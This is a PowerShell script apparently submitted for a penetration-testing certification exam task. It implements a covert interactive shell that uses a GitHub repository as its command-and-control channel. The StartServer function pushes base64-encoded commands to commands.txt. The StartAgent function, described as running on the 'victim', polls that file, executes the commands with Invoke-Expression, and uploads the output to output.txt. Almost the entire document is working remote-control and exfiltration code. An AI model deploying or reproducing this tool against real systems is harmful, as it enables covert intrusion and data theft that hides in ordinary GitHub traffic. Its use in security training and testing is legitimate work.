## Powershell For Penetration Testers Exam Task 8 - Use a popular third party website for exfiltration.
function StartServer
{ 
<#
.SYNOPSIS
A powershell script that uses GitHub for interactive shell.

.DESCRIPTION
Powershell script the uses Github website as an interactive shell infrastructure, using this script permits you to execute commands on target using GitHub

.PARAMTER token
The user token from GitHub web site

.PARAMTER User
The user name on GitHub site

.PARAMTER Repo
The user repository on GitHub

.EXAMPLE
PS C:\> . .\github-intractive.ps1
PS C:\> StartServer -token <Your Personal Token>  -User <user> -Repo <repository>

.LINK
https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
https://developer.github.com/v3/
https://wilsonmar.github.io/powershell-rest-api/#Invoke-WebMethod


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
	   
	   [Parameter(Mandatory = $true)]
       [String]
       $User,
	   
	   [Parameter(Mandatory = $true)]
       [String]
       $Repo

    )

	# For loop to continually take input from user and send it to victim
	while ($true){
		
		# Enabling TLS 
		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		
		# Reading use input
		$command = read-host 'Enter command'
		
		# File name to write into it in Github
		$fileToWrite = "commands.txt"
		
		# Getting the sha value of the file
		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
		
		# File sha value
		$fileSha = $fileShaResponse.sha
		
		# Conver user input to Base64
		$commandContentEncoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command))
		
		# Building parameters for invoke-restmethod
		$auth = @{"Authorization"="token $token"}
		$data = @{"message"="CommitMessage"; "content"=$commandContentEncoded; "sha"=$fileSha ; "branch"="master"; "path"="commands.txt"}
		
		# Convert data list to Json 
		$jsonData = ConvertTo-Json $data
		
		# invoking the rest method request
		try {
			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
			$fResponse = $response | select -ExpandProperty Content
			$fileSha = $fResponse.sha
		}
		# If any error, re-invoke the rest method
		catch {
			$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
			$fResponse = $response | select -ExpandProperty Content
			$fileSha = $fResponse.sha
		}
		
		# Printing some output to the user
		write-host "[+] Executing Command ..." -ForeGroundColor Green 
		Start-Sleep -s 3
		
		# invoke the rest request to the output file then decode the value returned
		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
		
		# Base64 decode the output and print it
		$b64Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($getDataResponse | select -ExpandProperty Content)))
		$b64Decoded
		
		# Print the user some output
		write-host "[+] Excuted Successfully ..." -ForeGroundColor Green 
		
	}
}



function StartAgent {

<#
.SYNOPSIS
A powershell script that uses GitHub for interactive shell.

.DESCRIPTION
Powershell script the uses Github website as an interactive shell infrastructure, using this script permits you to execute commands on target using GitHub

.PARAMTER token
The user token from GitHub web site

.PARAMTER User
The user name on GitHub site

.PARAMTER Repo
The user repository on GitHub

.EXAMPLE
PS C:\> . .\github-intractive.ps1
PS C:\> StartAgent -token <Your Personal Token>  -User <user> -Repo <repository>

.LINK
https://channel9.msdn.com/Blogs/trevor-powershell/Automating-the-GitHub-REST-API-Using-PowerShell
https://developer.github.com/v3/
https://wilsonmar.github.io/powershell-rest-api/#Invoke-WebMethod

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225
#>

	
	[CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
	   
	   [Parameter(Mandatory = $true)]
       [String]
       $User,
	   
	   [Parameter(Mandatory = $true)]
       [String]
       $Repo

    )
	
	# Enable TLS
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	
	# continually execute commands untill killed
	while ($true){
		
		# Build parameters for the rest request
		$auth = @{"Authorization"="token $token"}
		
		# Saving the file sha value
		$fileShaResponse = Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
		$fileSha = $fileShaResponse.sha
		
		# Taking user commands to execute on victim
		$getDataResponse =  Invoke-RestMethod -Headers $auth -Method GET  -Uri "https://api.github.com/repos/$User/$Repo/contents/commands.txt" -ErrorAction SilentlyContinue
		
		# If response returned
		if ($getDataResponse){
			
			write-host "[+] Getting commands ..." -ForeGroundColor Green
			
			# Base64 decode the value returned from previous rest request
			$b64Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($getDataResponse | select -ExpandProperty Content)))
			
			# Execute the command
			$executeResults = Invoke-Expression $b64Decoded
			
			# Base64 encode the result of executed command
			$executeResultsB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($executeResults))
			
			# Build the parameters for the rest method
			$data = @{"message"="CommitMessage"; "content"=$executeResultsB64;"sha"=$fileSha; "branch"="master"; "path"="output.txt"}
			$jsonData = ConvertTo-Json $data
			
			# Invoke the rest method to upload the result of executed command
			try {
				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
				if ($response){
					write-host "[+] Executed commands successfully !" -ForeGroundColor Green
				}
				else {
					write-host "[-] Error execting commands ..." -ForeGroundColor Red
				}
			}
			
			# Re-invoke the rest method to upload the result of executed command
			catch {
				$response = Invoke-RestMethod -Headers $auth -Method PUT -Body $jsonData -Uri  "https://api.github.com/repos/$User/$Repo/contents/output.txt" -ErrorAction SilentlyContinue
				if ($response){
					write-host "[+] Executed commands successfully !" -ForeGroundColor Green
				}
				else {
					write-host "[-] Error execting commands ..." -ForeGroundColor Red
				}
			}
			
		}
		else {
			write-host '[-] Waiting for commands to execute ...' -ForeGroundColor Red
		}
		
	
	}


}
